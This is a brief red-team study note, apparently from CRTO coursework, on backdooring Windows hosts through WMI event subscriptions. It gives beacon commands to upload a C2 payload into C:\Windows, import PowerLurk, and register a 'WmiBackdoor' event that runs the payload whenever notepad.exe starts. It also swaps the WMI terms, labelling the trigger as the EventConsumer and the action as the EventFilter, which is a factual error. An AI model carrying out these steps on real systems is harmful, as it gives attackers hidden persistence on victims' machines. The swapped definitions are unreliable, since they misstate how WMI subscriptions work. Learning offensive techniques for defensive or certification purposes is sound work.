
WMI events allow to based on an action (EventConsumer) certain other actions can happen (EventFilter). 

Actions like a certain tool, service, is executed, or a usb is plugged, or a login, can trigger the following events.

### 🖊️ Set Up

1) You can use a tool like [Powerlurk](https://github.com/Sw4mpf0x/PowerLurk) to create these events
2) Upload your payload ([[TCP Beacon]]) and load ps script

	```
	beacon> cd C:\Windows
	beacon> upload C:\Payloads\dns_x64.exe
	beacon> powershell-import C:\Tools\PowerLurk.ps1
	```

3) Register the event, for example:

	`beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe`

In this example, when the notepad.exe is executed (EventConsumer), the payload is executed (EventFilter).

The backdoor can be removed with `Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject`.


### Properties
---
📆 created   {{10-02-2024}} 21:17
🏷️ tags: #redteam #crto 

---

